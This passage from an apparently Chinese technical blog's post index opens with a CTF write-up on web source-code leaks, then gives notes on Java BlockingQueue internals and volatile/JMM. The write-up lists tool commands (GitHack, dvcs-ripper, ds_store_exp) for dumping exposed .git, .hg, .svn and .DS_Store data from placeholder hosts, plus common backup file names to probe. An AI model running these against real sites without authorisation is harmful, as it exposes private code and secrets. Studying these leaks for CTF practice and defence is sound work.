百度。这里贴一下git信息泄露利用的python脚本。下载完了之后利用python执行，python GitHack.py http://XXXXXXX/.git\n这样将会在dis目录下生成以ip地址以及端口号命名的文件夹，大家进去看一下里面是否存在.git文件夹\n0x03GIT命令使用切换到该目录下面\n使用git log 查看当前版本，使用git reset –hard 9d9fab3bd7e53c454dee1c9a7abc01e499882815还原到以前的版本。然后就可以查看到flag.\n附录：常用git命令摘录自：http://www.cnblogs.com/lwzz/archive/2013/02/23/2921426.html\n最基本的命令：\ngit clone 拷贝并跟踪远程的master分支。跟踪的好处是以后可以直接通过pull和push命令来提交或者获取远程最新的代码，而不需要指定远程分支名字。\ngit submodule init\ngit submodule update\n参考示意图\nHEAD 指向当前的commit 对象(可以想象为当前分支的别名)，同时也用来表明我们在哪个branch上工作。所以当我们使用HEAD来操作指针的时候，其实就是不改变当前的commit的指向。\n对照这张图来理解两段提交，工作区(working tree)，暂存区（index）和 branch之间的关系\n显示信息类命令git ls-files -u 显示冲突的文件，-s是显示标记为冲突已解决的文件\ngit diff 对比工作区和stage文件的差异git diff –cached 对比stage和branch之间的差异\ngit branch 列出当前repository下的所有branchgit branch –a 列出local 和remote下的所有branch\ngit ls-files –stage 检查保存在stage的文件\ngit log 显示到HEAD所指向的commit为止的所有commit记录 。使用reset HEAD~n 命令使HEAD指针向前移动，会导致HEAD之后的commit记录不会被显示。\ngit log -g则会查询reflog去查看最近做了哪些动作，这样可以配合git branch 恢复之前因为移动HEAD指针所丢弃的commit对象。如果reflog丢失则可以通过git fsck –full来查看没被引用的commit对象。git log -p -2 对比最新两次的commit对象log -1 HEAD\ngit log –pretty&#x3D;oneline\ngit log –stat 1a410e 查看sha1为1a410e的commit对象的记录\ngit blame -L 12,22 sth.cs 如果你发现自己代码中 的一个方法存在缺陷,你可以用git blame来标注文件,查看那个方法的每一行分别是由谁 在哪一天修改的。下面这个例子使用了-L选项来限制输出范围在第12至22行\n创建类命令git brach branchName 创建名为branchName的branchgit checkout branchName 切换到branchName的branchgit checkout -b 创建并切换，也就是上面两个命令的合并\ngit brach branchName ef71 从commit ef71创建名为branchName的branch\n撤销类命令如果是单个文件1.use “git reset HEAD …” to unstage如果已经用add 命令把文件加入stage了，就先需要从stage中撤销\n然后再从工作区撤销2.use “git checkout – …” to discard changes in working directory\ngit checkout a.txt  撤销a.txt的变动（工作区上的文件）如果是多个文件git chenkout .\n如果已经commit 了，则需要git commit –amend 来修改，这个只能修改最近上一次的,也就是用一个新的提交来覆盖上一次的提交。因此如果push以后再做这个动作就会有危险\n$ git reset –hard HEAD 放弃工作区和index的改动,HEAD指针仍然指向当前的commit.（参照第一幅图）\n这条命令同时还可以用来撤销还没commit的merge,其实原理就是放弃index和工作区的改动，因为没commit的改动只存在于index和工作区中。\n$ git reset –hard HEAD^ 用来撤销已经commit的内容(等价于 git reset –hard HEAD~1) 。原理就是放弃工作区和index的改动，同时HEAD指针指向前一个commit对象。\ngit revert 也是撤销命令，区别在于reset是指向原地或者向前移动指针，git revert是创建一个commit来覆盖当前的commit,指针向后移动\n提交类命令git add 跟踪新文件或者已有文件的改动，或者用来解决冲突\ngit commit 把文件从stage提交到branch\ngit commit -a 把修改的文件先提交到stage,然后再从stash提交到branch\n删除类命令git rm –cached readme.txt 只从stage中删除，保留物理文件\ngit rm readme.txt 不但从stage中删除，同时删除物理文件\ngit mv a.txt b.txt 把a.txt改名为b.txt\nMerge类命令\n在冲突状态下，需要解决冲突的文件会从index打回到工作区。\n1.用工具或者手工解决冲突2.git add 命令来表明冲突已经解决。3.再次commit 已解决冲突的文件。\n$ git reset –hard ORIG_HEAD 用来撤销已经commit 的merge.$ git reset –hard HEAD 用来撤销还没commit 的merge,其实原理就是放弃index和工作区的改动。\ngit reset –merge ORIG_HEAD，注意其中的–hard 换成了 –merge，这样就可以避免在回滚时清除working tree\n\n.hg源码泄漏：漏洞成因：hg init的时候会生成.hg，http://www.xx.com/.hg/，\n工具：dvcs-ripper，（rip-hg.pl -v -u http://www.xx.com/.hg/）\n.git源码泄漏：漏洞成因：在运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等，没有删除这个文件，导致泄漏，http://www.xxx.com/.git/config\n工具：GitHack，dvcs-ripper，（GitHack.py http://www.xxx.com/.git，rip-hg.pl -v -u http://www.xx.com/.git/）\n.DS_Store源码泄漏：漏洞成因：在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，http://www.xxx.com/.ds_store\n工具：dsstoreexp，（python ds_store_exp.py http://www.xxx.com/.DS_Store）\n网站备份压缩文件：在网站的使用过程中，往往需要对网站中的文件进行修改，升级，此时就需要对网站整或其中某一页面进行备份，当备份文件或修改过程中的缓存文件因为各种原因被留在网站web目录下，而该目录又没有设置访问权限，就有可能导致备份文件被下载，导致信息泄漏，给服务器安全埋下隐患。.rar， .zip， .7z， .tar.gz， .bak， .swp， .txt， .html，\n工具：可以使用一些扫描软件，进行扫描，如awvs之类的\n像.swp文件，就是vim源文件泄漏，&#x2F;.index.php.swp或&#x2F;index.php~ 可以直接用vim -r inde.php来读取文件\n\n常见的网站源码备份文件后缀\n\ntar\ntar.gz\nzip\nrar\n\n常见的网站源码备份文件名\n\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp\n\n我做这道题目的时候，找到了flag_2768649.txt  不过我真没想要用URL去加载\n回想起来 这毕竟是网站源码 那么我们去网站上查看嘛\nSVN导致文件泄漏：版本控制系统\n工具：dvcs-ripper，Seay-Svn，（rip-svn.pl -v -u http://www.xxx.com/.svn/）\n\n我遇到的题目类型\nbak文件\n\nvim\n\n. DS_Store\n\n利用dvcs-rip来操作  .svn泄露 和 .hg泄露\n在泄露的时候可能文件中没有flag 但是给了文件名字\n可以尝试利用curl看看能不能得到。\n\n\n我打算在四月初花费三天重做一遍CTFhub，然后再写这篇文章！\n","categories":["安全"]},{"title":"阻塞队列BlokingQueue","url":"/2021/05/03/2021/%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97BlokingQueue/","content":"\n\n什么是阻塞队列阻塞队列(BlockingQueue)是java.util.concurrent包提供的用于解决并发生产者—消费者问题最有用的类，它的特性是在任意时刻只有一个线程可以对队列进行出队和入队操作。\n并且阻塞队列提供了超时返回null的机制，在许多生产场景里都可以看到这个工具的身影。比如：线程池、Eureka、Nacos、Netty已经各种MQ产品。\nAPI以下这些方法是BlockingQueue接口中的重要方法，主要分为取元素和放元素两种行为：\n\n\n\n方法\n说明\n\n\n\nadd()\n如果插入成功则返回 true，否则抛出 IllegalStateException 异常\n\n\nput()\n将指定的元素插入队列，如果队列满了，那么会阻塞直到有空间插入\n\n\noffer()\n如果插入成功则返回 true，否则返回 false\n\n\noffer(E e, long timeout, TimeUnit unit)\n尝试将元素插入队列，如果队列已满，那么会阻塞直到有空间插入\n\n\ntake()\n获取队列的头部元素并将其删除，如果队列为空，则阻塞并等待队列中有元素\n\n\npoll(long timeout, TimeUnit unit)\n检索并删除队列的头部，如有必要，等待指定的等待时间以使元素可用，如果超时返回null\n\n\n队列类型基于BlockingQueue接口实现了多种阻塞队列，队列类型主要有以下两者：\n\n无限队列 （unbounded queue ）：几乎可以无限增长\n有限队列 （ bounded queue ）：定义了最大容量\n\nArrayBlockingQueue队列基于数组实现,容量大小在创建ArrayBlockingQueue对象时已定义好数据结构如下图：\n\n\n创建队列\n\nBlockingQueue&lt;String&gt; blockingQueue = new ArrayBlockingQueue&lt;&gt;(5);\n\n该队列在线程池中有比较多的应用，适用于生产者消费者场景。\n工作原理是基于ReentrantLock保证线程安全，根据Condition实现队列满时的阻塞。\nLinkedBlockingQueue是一个基于链表的无界队列(理论上有界) ：\nBlockingQueue&lt;String&gt; blockingQueue = new LinkedBlockingQueue&lt;&gt;();\n\n上面这段代码中，blockingQueue 的容量将设置为Integer.MAX_VALUE。\n向无限队列添加元素的所有操作都将永远不会阻塞(不是说不会加锁保证线程安全)，因此它可以增长到非常大的容量。\n使用无限 BlockingQueue 设计生产者 - 消费者模型时最重要的是消费者应该能够像生产者向队列添加消息一样快地消费消息 。否则，内存可能会填满，然后产生OutOfMemory异常。\nPriorityBlockingQueuePriorityBlockingQueue是一个支持优先级的无界阻塞队列。\n默认情况下元素采取自然顺序升序排列。也可以自定义类实现compareTo()方法来指定元素排序规则，或者初始化PriorityBlockingQueue时，指定构造参数Comparator来对元素进行排序。\n需要注意的是不能保证同优先级元素的顺序。\nDelayQueue由优先级堆支持的、基于时间的调度队列，内部基于无界队列PriorityQueue实现，而无界队列基于数组的扩容实现。 队列创建：\nBlockingQueue&lt;String&gt; blockingQueue = new DelayQueue();\n\n要求入队的对象必须要实现Delayed接口,而Delayed集成自Comparable接口。主要有以下应用场景：\n\n可以用DelayQueue保存缓存元素的有效期，使用一个线程循环查询DelayQueue,一旦能从DelayQueue中获取元素，表示缓存有效期到了。\n使用DelayQueue保存当前将会执行的任务和执行时间，一旦从DelayQueue中取到任务就开始执行，比如TimerQueue就是使用DelayQueue实现的。\n\nSynchronousQueueSynchronousQueue是一个不存储元素的阻塞队列。每一个put操作必须等待一个take操作，否则不能继续添加元素。SynchronousQueue可以看成是一个传球手，负责把生产者线程处理的数据直接传递给消费者线程。队列本身并不存储任何元素，非常适合传递性场景。SynchronousQueue的吞吐量高于LinkedBlockingQueue和ArrayBlockingQueue。\nLinkedTransferQueueLinkedTransferQueue是一个由链表结构组成的无界阻塞TransferQueue队列。相对于其他阻塞队列，LinkedTransferQueue多了tryTransfer和transfer方法。\nLinkedBlockingDequeLinkedBlockingDeque是一个由链表结构组成的双向阻塞队列。所谓双向队列指的是可以从队列的两端插入和移出元素。双向队列因为多了一个操作队列的入口，在多线程同时入队时，也就减少了一半的竞争\n代码举例import java.util.concurrent.ArrayBlockingQueue;import java.util.concurrent.BlockingQueue;import java.util.concurrent.ThreadLocalRandom;/** * @description: * @author: Liduoan * @time: 2021/5/3 */public class liduoan &#123;    private static class Apple&#123;    &#125;    static BlockingQueue&lt;Apple&gt; basket = new ArrayBlockingQueue&lt;Apple&gt;(10);    private static class Consumer extends Thread&#123;        @Override        public void run() &#123;            while(true)&#123;                try &#123;                    basket.take();                    System.out.println(Thread.currentThread().getName() + &quot;拿走了苹果&quot;);                &#125; catch (InterruptedException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;    private static class Producer extends Thread&#123;        @Override        public void run() &#123;            while (true)&#123;                int num = ThreadLocalRandom.current().nextInt(1, 4);                System.out.println(Thread.currentThread().getName() + &quot;放下了&quot; + num + &quot;苹果&quot;);                for (int i = 0; i &lt;= num; i++) &#123;                    try &#123;                        basket.put(new Apple());                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                &#125;            &#125;        &#125;    &#125;    public static void main(String[] args) &#123;        for(int i=1;i&lt;=7;i++)&#123;            new Consumer().start();        &#125;        for(int i=1;i&lt;=3;i++)&#123;            new Producer().start();        &#125;    &#125;&#125;\n\n简单的例子说明了一些问题\n队列满的时候某线程获取锁释放锁如何操作，队列空的时候又该如何操作。\n注意到仅仅只是调用了\nbasket.put(E e); //向队列中添加元素basket.take();\t  //从队列中获取元素\n\n有没有一种感觉，它已经把大量的细节都封装好了，仅仅给了我们某几个API就可以满足\n你拿去，你生产。两者之间的种种问题都被内部解决好了。\n那么我们想想有什么问题呢？\n1、消费者拿，然而队列为空\n2、生产者产出，而队列满了\n3、线程在CLH中排队，队列满了，然后后面依旧是生产者线程。\nArrayBlockingQueue源码构造方法// lock字段，锁final ReentrantLock lock;// 不为空,即可以出队的条件private final Condition notEmpty;// 不为满,即可以入队的条件private final Condition notFull;// 构造方法 public ArrayBlockingQueue(int capacity, boolean fair) &#123;     if (capacity &lt;= 0)         throw new IllegalArgumentException();     this.items = new Object[capacity];     // 创建一个ReentrantLock     lock = new ReentrantLock(fair);     // 两个条件对象，针对队空和队满的场景     notEmpty = lock.newCondition();     notFull =  lock.newCondition(); &#125;\n\n可以看到，ArrayBlockingQueue中定义了一个ReentrantLock和两个Condition，分别用于队列同步和队空、队满的情况，并且在构造方法中对它们进行初始化。\n入队public void put(E e) throws InterruptedException &#123;    //检查这个值是不是空    checkNotNull(e);    //ReetrantLock锁    final ReentrantLock lock = this.lock;    //以可中断方式锁住    lock.lockInterruptibly();    try &#123;        //当这个队列满了        while (count == items.length)            //等待notFull的条件，并且释放锁            notFull.await();        //否则就直接入队        enqueue(e);    &#125; finally &#123;        //解锁        lock.unlock();    &#125;&#125;private void enqueue(E x) &#123;    // assert lock.getHoldCount() == 1;    // assert items[putIndex] == null;    final Object[] items = this.items;    items[putIndex] = x;    if (++putIndex == items.length)        putIndex = 0;    count++;    //发出队列不空条件    notEmpty.signal();&#125;\n\n可以看到，入队方法通过lock()和unlock()进行了同步。\n当队列满了，而继续put进去的时候，会触发notFull.await();\n也就是进入阻塞，并释放锁！【被从阻塞中出来的时候，需要有notFull.signal();\n这个在具体的实现类中AbstractQueuedSynchronizer中有这样的方法\npublic final void await() throws InterruptedException &#123;    //这里判断是否出现中断    if (Thread.interrupted())        throw new InterruptedException();        Node node = addConditionWaiter();    //这里会把锁释放    int savedState = fullyRelease(node);    int interruptMode = 0;    while (!isOnSyncQueue(node)) &#123;        //进入阻塞！！！！！！！！！！！！        LockSupport.park(this);        if ((interruptMode = checkInterruptWhileWaiting(node)) != 0)            break;    &#125;    if (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)        interruptMode = REINTERRUPT;    if (node.nextWaiter != null) // clean up if cancelled        unlinkCancelledWaiters();    if (interruptMode != 0)        reportInterruptAfterWait(interruptMode);&#125;final int fullyRelease(Node node) &#123;    boolean failed = true;    try &#123;        int savedState = getState();        if (release(savedState)) &#123;            failed = false;            return savedState;        &#125; else &#123;            throw new IllegalMonitorStateException();        &#125;    &#125; finally &#123;        if (failed)            node.waitStatus = Node.CANCELLED;    &#125;&#125;public final boolean release(int arg) &#123;    //最后调用这里释放锁！！！！！！！！！！！！！    if (tryRelease(arg)) &#123;        Node h = head;        if (h != null &amp;&amp; h.waitStatus != 0)            unparkSuccessor(h);        return true;    &#125;    return false;&#125;\n\n而之后当消费者进行消费时，会触发notFull.signal();\n\n如果队列不为满，成功放入元素后，需要通知notEmpty不为空的条件成立。\n出队方法public E take() throws InterruptedException &#123;    //初始化锁    final ReentrantLock lock = this.lock;    //尝试加锁，未加锁则被阻塞    lock.lockInterruptibly();    try &#123;        // 如果队列为空        while (count == 0)            // 等待notEmpty的条件，并且释放锁            notEmpty.await();        // notEmpty条件成立则入队        return dequeue();    &#125; finally &#123;        //解锁        lock.unlock();    &#125;&#125;// 出队private E dequeue() &#123;    // assert lock.getHoldCount() == 1;    // assert items[takeIndex] != null;    final Object[] items = this.items;    @SuppressWarnings(&quot;unchecked&quot;)    E x = (E) items[takeIndex];    items[takeIndex] = null;    if (++takeIndex == items.length)        takeIndex = 0;    count--;    if (itrs != null)        itrs.elementDequeued();    // 释放notFull条件    notFull.signal();    return x;&#125;\n\n同样出队方法通过lock()和unlock()进行了同步，同时如果队列为空，当前线程需要释放锁，阻塞线程，并且等待notEmpty不为空的条件成立。\n如果队列不为空，成功取出元素后，需要通知notFull不为满的条件成立。\n基本的大致就是这样，但是更为有意思的是，它内部会使用条件等待队列\n当某个线程不满足条件是，会从CLH队列进入条件等待队列，然后又会插回CLH队列。\n慢慢的就依靠这个条件使得不同属性的线程获得锁。\n","tags":["2021"]},{"title":"并发编程及volatile详解","url":"/2021/04/20/2021/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/","content":"\n\nJMM模型JMM模型的理解：\nJava内存模型(Java Memory Model简称JMM)是一种抽象的概念，并不真实存在，它描述的是一组规则或规范，通过这组规范定义了程序中各个变量（包括实例字段，静态字段和构成数组对象的元素）的访问方式。\nJVM运行程序的实体是线程，而每个线程创建时JVM都会为其创建一个工作内存(有些地方称为栈空间)，用于存储线程私有的数据，而Java内存模型中规定所有变量都存储在主内存，主内存是共享内存区域，所有线程都可以访问，但线程对变量的操作(读取赋值等)必须在工作内存中进行。\n\n首先要将变量从主内存拷贝的自己的工作内存空间\n然后对变量进行操作，操作完成后再将变量写回主内存【不能直接操作主内存中的变量\n工作内存中存储着主内存中的变量副本拷贝\n\n前面说过，工作内存是每个线程的私有数据区域，因此不同的线程间无法访问对方的工作内存，线程间的通信(传值)必须通过主内存来完成。\nJMM不同于JVM内存模型JMM不同于JVM内存模型。恰当的来说，JMM描述的是一组规则，通过这组规则控制程序中各个变量在共享数据区域和私有数据区域的访问方式。\nJMM是围绕原子性，有序性，可见性展开。\nJMM于Java内存区域唯一相似点，都存在共享数据区域和私有数据区域。\n在JMM中主内存属于共享数据区域【堆、方法区（元空间）\n私有数据区域大致为【程序计数器、虚拟机栈、本地方法栈。\n所以说，我们从逻辑上来看，存在主内存和各个线程私有的工作内存！\n主内存：\n主要存储的是Java实例对象，所有线程创建的实例对象都存放在主内存中，不管实例对象是成员变量还是方法中的本地变量（局部变量），当然也包括了共享的类信息、常量、静态变量。\n由于是共享数据区域，多条线程对变量进行访问可能存在线程安全问题。\n工作内存：\n主要存储当前方法的所有本地变量信息(工作内存中存储着主内存中的变量副本拷贝)。\n每个线程只能访问自己的工作内存，即线程中的本地变量对其它线程是不可见的，就算是两个线程执行的是同一段代码，它们也会各自在自己的工作内存中创建属于当前线程的本地变量，当然也包括了字节码行号指示器、相关Native方法的信息。\n注意由于工作内存是每个线程的私有数据，线程间无法相互访问工作内存，因此存储在工作内存的数据不存在线程安全问题。\n\n根据JVM虚拟机规范主内存与工作内存的数据存储类型以及操作方式\n对于一个实例对象中的成员方法而言，如果方法中包含本地变量是基本数据类型（boolean,byte,short,char,int,long,float,double），将直接存储在工作内存的帧栈结构中，但倘若本地变量是引用类型，那么该变量的引用会存储在功能内存的帧栈中，而**对象实例将存储在主内存(**共享数据区域，堆)中。\n但对于实例对象的成员变量，不管它是基本数据类型或者包装类型(Integer、Double等)还是引用类型，都会被存储到堆区。\n至于static变量以及类本身相关信息将会存储在主内存中。需要注意的是，在主内存中的实例对象可以被多线程共享，倘若两个线程同时调用了同一个对象的同一个方法，那么两条线程会将要操作的数据拷贝一份到自己的工作内存中，执行完成操作后才刷新到主内存\n并发三大特性并发编程的可见性，原子性与有序性问题\n原子性原子性指的是一个操作是不可中断的，即使是在多线程环境下，一个操作一旦开始就不会被其他线程影响。\n可见性理解了JMM后，可见性容易了，可见性指的是当一个线程修改了某个共享变量的值，其他线程是否能够马上得知这个修改的值。\n对于串行程序来说，可见性是不存在的，因为我们在任何一个操作中修改了某个变量的值，后续的操作中都能读取这个变量值，并且是修改过的新值。\n但在多线程环境中可就不一定了，由于线程对共享变量的操作都是线程拷贝到各自的工作内存进行操作后才写回到主内存中的，这就可能存在一个线程A修改了共享变量x的值，还未写回主内存时\n另外一个线程B又对主内存中同一个共享变量x进行操作，但此时A线程工作内存中共享变量x对线程B来说并不可见。\n这种工作内存与主内存同步延迟现象就造成了可见性问题，另外指令重排以及编译器优化也可能导致可见性问题，通过前面的分析，我们知道无论是编译器优化还是处理器优化的重排现象，在多线程环境下，确实会导致程序轮序执行的问题，从而也就导致可见性问题。\n有序性有序性是指对于单线程的执行代码，我们总是认为代码的执行是按顺序依次执行的，这样的理解并没有毛病，毕竟对于单线程而言确实如此。\n但对于多线程环境，则可能出现乱序现象，因为程序编译成机器码指令后可能会出现指令重排现象，重排后的指令与原指令的顺序未必一致。\n要明白的是，在Java程序中，倘若在本线程内，所有操作都视为有序行为，如果是多线程环境下，一个线程中观察另外一个线程，所有操作都是无序的，前半句指的是单线程内保证串行语义执行的一致性，后半句则指指令重排现象和工作内存与主内存同步延迟现象。\n关于JMM如何解决三大特性原子性问题\n我们可以使用 synchronized和Lock 实现原子性\n使用锁可以保证任一时刻只有一个线程访问该代码块。\n可见性问题\nvolatile关键字保证可见性。\n当一个共享变量被volatile修饰时，它会保证修改的值立即被其他的线程看到，即修改的值立即更新到主存中，当其他线程需要读取时，它会去内存中读取新值。\nsynchronized和Lock也可以保证可见性，因为它们可以保证任一时刻只有一个线程能访问共享资源，并在其释放锁之前将修改的变量刷新到内存中。\n很重要的点是synchronized和Lock可以保证可见性，这是因为在释放锁之前会把变量刷新到内存中。\n有序性问题\n在Java里面，可以通过volatile关键字来保证一定的“有序性”。\n另外可以通过synchronized和Lock来保证有序性，很显然，synchronized和Lock保证每个时刻是有一个线程执行同步代码，相当于是让线程顺序执行同步代码，自然就保证了有序性。\nJava内存模型：\n每个线程都有自己的工作内存（类似于前面的高速缓存）。\n线程对变量的所有操作都必须在工作内存中进行，而不能直接对主存进行操作。\n并且每个线程不能访问其他线程的工作内存。Java内存模型具备一些先天的“有序性”，即不需要通过任何手段就能够得到保证的有序性，这个通常也称为happens-before 原则。\n如果两个操作的执行次序无法从happens-before原则推导出来，那么它们就不能保证它们的有序性，虚拟机可以随意地对它们进行重排序。\n指令重排序：\njava语言规范规定JVM线程内部维持顺序化语义。\n即只要程序的最终结果与它顺序化情况的结果相等，那么指令的执行顺序可以与代码顺序不一致，此过程叫指令的重排序。\n指令重排序的意义是什么？JVM能根据处理器特性（CPU多级缓存系统、多核处理器等）适当的对机器指令进行重排序，使机器指令能更符合CPU的执行特性，最大限度的发挥机器性能。\n\n\nvolatile解析volatile是虚拟机提供的轻量级的同步机制。\n一般是有两个作用\n\n保证可见性\n禁止指令重排\n\nvolatile可见性关于volatile的可见性作用，我们必须意识到被volatile修饰的变量对所有线程总数立即可见的。\n对volatile变量的所有写操作总是能立刻反应到其他线程中\n这里就需要了解JVM内存模型了，分主内存和线程的工作内存。【注意JMM是一个规则。\n原子性注意到volatile是不能保证原子性的！\n//示例public class VolatileVisibility &#123;    public static volatile int i =0;    public static void increase()&#123;        i++;    &#125;&#125;\n\n我们需要知道i++不是一个原子操作，而是一般分为三个步骤，例如取值，+1，赋值。\nvolatile可见性分析首先我们需要简单的明白一般的代码流程\n\n一个文件加载的所有流程一般为：\n1、通过类加载器加载，在JVM的方法区中把类信息，静态变量，常量创建好，把Class对应类在堆中创建好。再通过后续操作，完成类加载。\n2、进行方法调用时候，会在该线程虚拟机栈中创建栈帧，然后分析需要运行什么。\n3、接着往底层走，会需要转化成对应的汇编，二进制，交付给CPU执行。\n4、最后CPU计算完结果，写回到内存中。\n缓存一致性协议当有多核CPU有多个一级缓存是，如何保证各个缓存数据一致，不会出现混乱的情况？\nMESI协议缓存状态MESI 是指4种状态的首字母。每个Cache line有4个状态，可用2个bit表示，它们分别是：\n缓存行（Cache line）:缓存存储数据的单元。这个是CPU执行的最小单位。也就是说，每一次CPU拿去一个缓存行进去。\n\n\n\n状态\n描述\n监听任务\n\n\n\nM 修改 (Modified)\n该Cache line有效，数据被修改了，和内存中的数据不一致，数据只存在于本Cache中。\n缓存行必须时刻监听所有试图读该缓存行相对就主存的操作，这种操作必须在缓存将该缓存行写回主存并将状态变成S（共享）状态之前被延迟执行。\n\n\nE 独享、互斥 (Exclusive)\n该Cache line有效，数据和内存中的数据一致，数据只存在于本Cache中。\n缓存行也必须监听其它缓存读主存中该缓存行的操作，一旦有这种操作，该缓存行需要变成S（共享）状态。\n\n\nS 共享 (Shared)\n该Cache line有效，数据和内存中的数据一致，数据存在于很多Cache中。\n缓存行也必须监听其它缓存使该缓存行无效或者独享该缓存行的请求，并将该缓存行变成无效（Invalid）。\n\n\nI 无效 (Invalid)\n该Cache line无效。\n无\n\n\n注意：\n对于M和E状态而言总是精确的，他们在和该缓存行的真正状态是一致的，而S状态可能是非一致的。\n如果一个缓存将处于S状态的缓存行作废了，而另一个缓存实际上可能已经独享了该缓存行，但是该缓存却不会将该缓存行升迁为E状态，这是因为其它缓存不会广播他们作废掉该缓存行的通知，同样由于缓存并没有保存该缓存行的copy的数量，因此（即使有这种通知）也没有办法确定自己是否已经独享了该缓存行。\n从上面的意义看来E状态是一种投机性的优化：\n如果一个CPU想修改一个处于S状态的缓存行，总线事务需要将所有该缓存行的copy变成invalid状态，而修改E状态的缓存不需要使用总线事务。\n\n总体来说，上图可以简易说明缓存一致性问题的解决方案\nMESI优化和他们引入的问题\n缓存的一致性消息传递是要时间的，这就使其切换时会产生延迟。当一个缓存被切换状态时其他缓存收到消息完成各自的切换并且发出回应消息这么一长串的时间中CPU都会等待所有缓存响应完成。可能出现的阻塞都会导致各种各样的性能问题和稳定性问题。\nCPU切换状态阻塞解决-存储缓存（Store Bufferes）\n比如你需要修改本地缓存中的一条信息，那么你必须将I（无效）状态通知到其他拥有该缓存数据的CPU缓存中，并且等待确认。等待确认的过程会阻塞处理器，这会降低处理器的性能。应为这个等待远远比一个指令的执行时间长的多。\nStore Bufferes\n为了避免这种CPU运算能力的浪费，Store Bufferes被引入使用。处理器把它想要写入到主存的值写到缓存，然后继续去处理其他事情。当所有失效确认（Invalidate Acknowledge）都接收到时，数据才会最终被提交。\n这么做有两个风险\nStore Bufferes的风险\n第一、就是处理器会尝试从存储缓存（Store buffer）中读取值，但它还没有进行提交。这个的解决方案称为Store Forwarding，它使得加载的时候，如果存储缓存中存在，则进行返回。\n第二、保存什么时候会完成，这个并没有任何保证。\n\n接下来我们再回到可见性分析来\n我们了解了缓存一致性的概念和具体的思路，那么我们再看可见性似乎就有大概的思路了\n接着用这张图\n\n主内存可以看作内存中的X=0，那么各个线程在工作内存中进行了拷贝。\n而在本线程中对变量进行处理变化，如果变量进行了改变，那么需要通知到其他线程放弃他们手中的拷贝。\n也就是图中的第六步—拷贝丢失。\n同时这也说明了volatile不具备原子性：\n当我们进行i++的时候，按照图中所示，A线程自加完毕，通知其他拷贝失效，需要从主内存中重新读取。\n然而B线程已经把缓存中的变量读到CPU了，到达了x++的三步【取值，自加，赋值】中的第一步取值结束。\n那么由于失效使得本次自加的得到结果不能准确了。\nvolatile禁止指令重排volatile关键字另一个作用就是禁止指令重排优化，从而避免多线程环境下程序出现乱序执行的现象。\n这里主要简单说明一下volatile是如何实现禁止指令重排优化的。先了解一个概念，内存屏障(Memory Barrier）。\n内存屏障硬件层的内存屏障Intel硬件提供了一系列的内存屏障，主要有： \n\nlfence，是一种Load Barrier 读屏障 \n\nsfence, 是一种Store Barrier 写屏障 \n\nmfence, 是一种全能型的屏障，具备ifence和sfence的能力 \n\nLock前缀，Lock不是一种内存屏障，但是它能完成类似内存屏障的功能。Lock会对CPU总线和高速缓存加锁，可以理解为CPU指令级的一种锁。它后面可以跟ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, XADD, and XCHG等指令。\n\n\n不同硬件实现内存屏障的方式不同，Java内存模型屏蔽了这种底层硬件平台的差异，由JVM来为不同的平台生成相应的机器码。 JVM中提供了四类内存屏障指令：\n\n\n\n屏障类型\n指令示例\n说明\n\n\n\nLoadLoad\nLoad1; LoadLoad; Load2\n保证load1的读取操作在load2及后续读取操作之前执行\n\n\nStoreStore\nStore1; StoreStore; Store2\n在store2及其后的写操作执行前，保证store1的写操作已刷新到主内存\n\n\nLoadStore\nLoad1; LoadStore; Store2\n在stroe2及其后的写操作执行前，保证load1的读操作已读取结束\n\n\nStoreLoad\nStore1; StoreLoad; Load2\n保证store1的写操作已刷新到主内存之后，load2及其后的读操作才能执行\n\n\n内存屏障，又称内存栅栏，是一个CPU指令，它的作用有两个。\n一是保证特定操作的执行顺序\n二是保证某些变量的内存可见性（利用该特性实现volatile的内存可见性）。\n由于编译器和处理器都能执行指令重排优化。\n如果在指令间插入一条Memory Barrier则会告诉编译器和CPU，不管什么指令都不能和这条Memory Barrier指令重排序，也就是说通过插入内存屏障禁止在内存屏障前后的指令执行重排序优化。\nMemory Barrier的另外一个作用是强制刷出各种CPU的缓存数据，因此任何CPU上的线程都能读取到这些数据的最新版本。\n总之，volatile变量正是通过内存屏障实现其在内存中的语义，即可见性和禁止重排优化。下面看一个非常典型的禁止重排优化的例子DCL，如下：\npublic class DoubleCheckLock &#123;    private volatile static DoubleCheckLock instance;    private DoubleCheckLock()&#123;&#125;    public static DoubleCheckLock getInstance()&#123;        //第一次检测        if (instance==null)&#123;            //同步            synchronized (DoubleCheckLock.class)&#123;                if (instance == null)&#123;                    //多线程环境下可能会出现问题的地方                    instance = new  DoubleCheckLock();                &#125;            &#125;        &#125;        return instance;    &#125;&#125;\n\n上述代码一个经典的单例的双重检测的代码，这段代码在单线程环境下并没有什么问题，但如果在多线程环境下就可以出现线程安全问题。原因在于某一个线程执行到第一次检测，读取到的instance不为null时，instance的引用对象可能没有完成初始化。\n\n因为instance &#x3D; new DoubleCheckLock();可以分为以下3步完成(伪代码)\n\nmemory = allocate();//1.分配对象内存空间instance(memory);//2.初始化对象instance = memory;//3.设置instance指向刚分配的内存地址，此时instance！=null            \n\n由于步骤1和步骤2间可能会重排序，如下：\nmemory=allocate();//1.分配对象内存空间instance=memory;//3.设置instance指向刚分配的内存地址，此时instance！=null，但是对象还没有初始化完成！instance(memory);//2.初始化对象\n\n由于步骤2和步骤3不存在数据依赖关系，而且无论重排前还是重排后程序的执行结果在单线程中并没有改变，因此这种重排优化是允许的。\n但是指令重排只会保证串行语义的执行的一致性(单线程)，但并不会关心多线程间的语义一致性。\n所以当一条线程访问instance不为null时，由于instance实例未必已初始化完成，那么调用该实例方法却调用不成功,也就造成了线程安全问题。\n那么该如何解决呢，很简单，我们使用volatile禁止instance变量被执行指令重排优化即可。\n  //禁止指令重排优化private volatile static DoubleCheckLock 